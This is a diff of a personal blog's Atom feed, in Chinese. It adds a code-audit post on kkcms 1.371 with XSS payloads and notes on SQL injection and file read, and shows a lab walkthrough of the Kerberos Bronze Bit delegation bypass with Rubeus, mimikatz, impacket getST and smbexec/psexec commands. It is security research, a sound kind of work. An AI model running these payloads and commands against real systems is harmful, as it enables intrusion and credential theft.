@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-03-19T06:44:57.600Z</updated>
+  <updated>2021-03-30T17:55:08.317Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>kkcms1.371代码审计</title>
+    <link href="http://422926799.github.io/posts/de5a64f.html"/>
+    <id>http://422926799.github.io/posts/de5a64f.html</id>
+    <published>2021-03-30T16:49:39.000Z</published>
+    <updated>2021-03-30T17:55:08.317Z</updated>
+    
+    <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的&lt;br&gt;but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询&lt;/p&gt;
+&lt;h2 id=&quot;预处理分析&quot;&gt;&lt;a href=&quot;#预处理分析&quot; class=&quot;heade</summary>
+      
+    
+    
+    
+    
+    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
     <link href="http://422926799.github.io/posts/9cf32cdf.html"/>
     <id>http://422926799.github.io/posts/9cf32cdf.html</id>
     <published>2021-03-19T06:28:37.000Z</published>
-    <updated>2021-03-19T06:44:57.600Z</updated>
+    <updated>2021-03-19T06:45:06.458Z</updated>
     
     <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
     
@@ -440,32 +463,6 @@
     
     
     <category term="ctf" scheme="http://422926799.github.io/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>数据结构实现数组</title>
-    <link href="http://422926799.github.io/posts/57421f1d.html"/>
-    <id>http://422926799.github.io/posts/57421f1d.html</id>
-    <published>2020-12-29T09:50:25.000Z</published>
-    <updated>2020-12-29T09:58:22.688Z</updated>
-    
-    <content type="html"><![CDATA[<p>昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构<br>目前需要学习的数据结构有：</p><pre><code>* 抽象数据类型 ADT，面向对象编程* 数组和列表* 链表，高级链表。双链表，循环双端链表* 队列，双端队列，循环双端队列* 栈，栈溢出* 算法分析，时间复杂度 大O 表示法* 哈希表，散列冲突* 字典* 集合* 递归* 查找：线性查找和二分查找* 基本排序算法* 高级排序算法: 归并排序、堆排序、快排* 树，二叉树* 图，dfs 和 bfs* python 内置常用数据结构和算法的使用。list, dict, set, collections 模块，heapq 模块* 面试笔试常考算法</code></pre><h2 id="数据和列表的区别"><a href="#数据和列表的区别" class="headerlink" title="数据和列表的区别"></a>数据和列表的区别</h2><p>数组：<br>数组是一个容器，它可以容纳一定数量的项目，这些项目是相同的类型。 大部分数据结构都使用数组来实现它们的算法。 以下是理解数组(Array)概念的重要术语。<br>元素 - 存储在数组中的每个项目称为元素。索引 - 数组中元素的每个位置都有一个数字索引，用于标识元素。//原文出自【易百教程】，商业转载请联系作者获得授权，非商业请保留原文链接：<a href="https://www.yiibai.com/python/py_data_structure/python_arrays.html" target="_blank" rel="noopener">https://www.yiibai.com/python/py_data_structure/python_arrays.html</a></p><p>列表：<br>列表是Python中最通用的数据类型，可以写成方括号之间的逗号分隔值(项目)列表。 使用列表的重要事项是，列表中的项目不必是相同的类型。也就是说一个列表中的项目(元素)可以是数字，字符串，数组，字典等甚至是列表类型。</p><p>数组和列表的区别为：数组只能放一个类型的数据，列表能放不同类型的数据</p><h2 id="使用python实现数组"><a href="#使用python实现数组" class="headerlink" title="使用python实现数组"></a>使用python实现数组</h2><p>虽然自带的Array的模块能实现数组，但是还是跟着文章走了一手<br>参考链接:<a href="https://blog.csdn.net/Tonywu2018/article/details/88819424" target="_blank" rel="noopener">https://blog.csdn.net/Tonywu2018/article/details/88819424</a></p><pre><code class="python">class Array(object):    def __init__(self,capacity,fillvalue=None):        self.items=list()        for count in range(capacity):            self.items.append(fillvalue)    def editarray(self,index):        if index+1&gt;int(len(self.items)):            #当当前索引下位标识超过数组长度自动添加数组长度            temp=Array(index+1)            for p in range(0,len(self.items)):                temp.__setitem__(p,self.items[p])            self.items=temp            del temp            return True        else:            return False    def __len__(self):        #返回数组长度        return len(self.items)    def __str__(self):        #返回str类型的数组        return str(self.items)    def __iter__(self):        #返回遍历好的数组        return iter(self.items)    def __getitem__(self, index):        #通过索引获取数组中的值        return self.items[index]    def __setitem__(self, index, newItem):        #替换指定位置的值        self.editarray(index)        self.items[index]=newItem        return self.items    def __delitem__(self, key):        #删除数组指定下标        del self.items[key]        return self.items    def __add__(self, value):        #数据末尾添加        calc=0        for k in self.items:            if len(str(k))!=0:                calc+=1            else:                break        self.__setitem__(calc,value)if __name__ == &#39;__main__&#39;:    a=Array(6)    for i in range(7):        a[i]=i    a.__delitem__(-1)    for x in a.__iter__():        print(x,end=&#39;&#39;)    a.__setitem__(0,9)    print(a.__str__())    a.__add__(101)    print(a.__str__())</code></pre><p>最终结果<br><img src="https://s3.ax1x.com/2020/12/29/rbUH0K.png" alt=""></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构&lt;br&gt;目前需要学习的数据结构有：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;* 抽象数据类型 ADT，面向对象编程
-* 数组和列表
-* 链表，高级链表。双链表，循环双端链表
-* 队列，双</summary>
-      
-    
-    
-    
-    
-    <category term="数据结构" scheme="http://422926799.github.io/tags/数据结构/"/>
     
   </entry>
   
